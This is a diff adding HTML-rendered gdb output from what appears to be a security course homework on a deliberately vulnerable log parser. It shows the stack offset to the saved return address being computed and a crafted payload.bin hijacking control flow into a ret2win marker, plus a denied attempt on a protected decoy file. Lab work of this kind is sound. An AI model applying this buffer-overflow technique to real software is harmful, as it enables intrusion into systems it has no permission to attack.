@@ -1,0 +1,42 @@
+
+
+
+
+<pre>(gdb) print &amp;buf
+<font color="#2AA1B3">$4</font> = (char (*)[128]) <font color="#12488B">0x7fffffffda70</font>
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffdb00:
+ rip = 0x401521 in vulnerable_copy (<font color="#26A269">src/legacy_log_parser.c</font>:67); saved rip = 0x401790
+ called by frame at 0x7fffffffdb50
+ source language c.
+ Arglist at 0x7fffffffdaf0, args: <font color="#2AA1B3">input</font>=0x406490 &apos;A&apos; &lt;repeats 152 times&gt;, &quot;6\023@&quot;, <font color="#2AA1B3">n</font>=160
+ Locals at 0x7fffffffdaf0, Previous frame&apos;s sp is 0x7fffffffdb00
+ Saved registers:
+  rbp at 0x7fffffffdaf0, rip at 0x7fffffffdaf8
+(gdb) print/x 0x7fffffffdaf8 - 0x7fffffffda70
+<font color="#2AA1B3">$5</font> = 0x88
+</pre>
+
+
+
+
+
+<pre> run payload.bin
+Starting program: <font color="#26A269">/home/melissa-ordonez/.openclaw/workspace/Documents/csce465-agentsec/hw3/src/legacy_log_parser</font> payload.bin
+
+This GDB supports auto-downloading debuginfo from the following URLs:
+  &lt;<font color="#26A269">https://debuginfod.ubuntu.com</font>&gt;
+Enable debuginfod for this session? (y or [n]) n
+Debuginfod has been disabled.
+To make this setting permanent, add &apos;set debuginfod enabled off&apos; to .gdbinit.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;<font color="#26A269">/lib/x86_64-linux-gnu/libthread_db.so.1</font>&quot;.
+Log preview (64 bytes):
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Copied 144 bytes
+Created markers/ret2win.txt
+Could not open protected decoy: Permission denied
+
+Program received signal SIGSEGV, Segmentation fault.
+<font color="#12488B">0x000000ba00000006</font> in <font color="#A2734C">??</font> ()
+</pre>
